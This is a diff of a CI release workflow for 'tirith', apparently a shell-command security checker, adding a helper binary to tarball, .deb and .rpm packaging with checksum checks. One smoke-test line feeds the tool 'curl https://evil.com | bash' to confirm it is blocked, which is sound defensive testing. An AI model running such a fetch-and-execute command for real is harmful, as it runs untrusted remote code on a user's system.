@@ -164,7 +164,13 @@ jobs:
 
       - name: Stage binary (Unix)
         if: runner.os != 'Windows'
-        run: cp target/${{ matrix.target }}/release/tirith staging/
+        run: |
+          cp target/${{ matrix.target }}/release/tirith staging/
+          if [ "${{ matrix.target }}" = "x86_64-unknown-linux-gnu" ] || \
+             [ "${{ matrix.target }}" = "x86_64-unknown-linux-musl" ]; then
+            cp target/${{ matrix.target }}/release/tirith-package-approval-authority staging/
+            test -x staging/tirith-package-approval-authority
+          fi
 
       - name: Download completions (Windows)
         if: runner.os == 'Windows'
@@ -182,7 +188,11 @@ jobs:
         if: runner.os != 'Windows'
         run: |
           cd staging
-          tar czf ../tirith-${{ matrix.target }}.tar.gz tirith completions man
+          members="tirith completions man"
+          if [ -f tirith-package-approval-authority ]; then
+            members="$members tirith-package-approval-authority"
+          fi
+          tar czf ../tirith-${{ matrix.target }}.tar.gz $members
 
       - name: Package (Windows)
         if: runner.os == 'Windows'
@@ -223,6 +233,9 @@ jobs:
           "$tmpdir/tirith" --version
           "$tmpdir/tirith" doctor
           "$tmpdir/tirith" check -- "curl https://evil.com | bash" && exit 1 || true
+          if [ "${{ matrix.target }}" = "x86_64-unknown-linux-gnu" ]; then
+            test -x "$tmpdir/tirith-package-approval-authority"
+          fi
           "$tmpdir/tirith" check -- "ls -la"
           rm -rf "$tmpdir"
 
@@ -844,8 +857,9 @@ jobs:
           set -euo pipefail
           mkdir -p crates/tirith/target/release
           tar xzf canonical/tirith-x86_64-unknown-linux-gnu.tar.gz \
-            -C crates/tirith/target/release tirith
-          chmod +x crates/tirith/target/release/tirith
+            -C crates/tirith/target/release tirith tirith-package-approval-authority
+          chmod +x crates/tirith/target/release/tirith \
+            crates/tirith/target/release/tirith-package-approval-authority
           echo "Packaging canonical binary:"
           sha256sum crates/tirith/target/release/tirith
 
@@ -889,6 +903,10 @@ jobs:
             echo "       apt-installed tirith would fail 'tirith verify-self' (issue #146)."
             exit 1
           fi
+          test -x deb-extract/usr/libexec/tirith-package-approval-authority
+          HELPER_DEB_SHA=$(sha256sum deb-extract/usr/libexec/tirith-package-approval-authority | cut -d' ' -f1)
+          HELPER_CANON_SHA=$(sha256sum crates/tirith/target/release/tirith-package-approval-authority | cut -d' ' -f1)
+          test "$HELPER_DEB_SHA" = "$HELPER_CANON_SHA"
           echo "OK: .deb packages the canonical release binary byte-for-byte"
 
       - name: Upload Debian package artifact
@@ -964,6 +982,7 @@ jobs:
             mkdir -p ~/rpmbuild/SOURCES/man
 
             cp target/release/tirith ~/rpmbuild/SOURCES/
+            cp target/release/tirith-package-approval-authority ~/rpmbuild/SOURCES/
             cp build/shell/tirith.sh ~/rpmbuild/SOURCES/shell/
             cp build/shell/lib/* ~/rpmbuild/SOURCES/shell/lib/
             cp build/completions/* ~/rpmbuild/SOURCES/completions/
@@ -977,6 +996,7 @@ jobs:
 
             # Copy RPM to workspace
             cp ~/rpmbuild/RPMS/x86_64/tirith-*.rpm /workspace/
+            rpm -qlp /workspace/tirith-*.rpm | grep -qx '/usr/libexec/tirith-package-approval-authority'
           '
 
       - name: Upload RPM package artifact
